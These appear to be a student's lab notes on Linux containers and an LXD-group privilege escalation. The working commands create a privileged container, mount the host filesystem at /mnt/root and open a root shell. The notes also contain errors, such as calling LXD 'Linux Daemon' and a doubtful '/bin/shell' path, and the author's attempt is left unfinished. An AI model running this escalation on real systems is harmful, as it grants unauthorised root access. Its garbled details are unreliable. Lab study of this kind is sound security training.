Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and 
isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

**Linux Containers**
Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a 
single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

**Linux Daemon**
Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container.
 we must be in either the LXC or LXD group to run these commands. 

 uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)

**Now to exploit:**
Eitehr create own container and transfer it to the target system, or use an existing container. 

If there is no password, lets import the container as an image.

After verifying image has been imported we can initiate the image and configure it. 
After verifying that this image has been successfully imported, we can initiate the image and configure it 
by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

commands ran: id
cd ContainerImages
ls
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz
lxc image list 
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|       | b14f17d61b9d | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Sep 15, 2025 at 5:58pm (UTC) |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
lxc init b14f17d61b9d privesc -c security.privileged=true   (b14.... was the fingerprint seen above)
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
(this adds device host-root to privsec)
Now we can start another continer and go to the path specified to access the resource as root. 
lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash

**NOTE** /bin/bash did not work HOWEVER /bin/shell did and provided root

ls -l /mnt/root to display root resourcecd

pretty sure I ran it properly, but I did not find any files in the root directory.  Checked the guide and it looked the same as what I did
may need more research. 
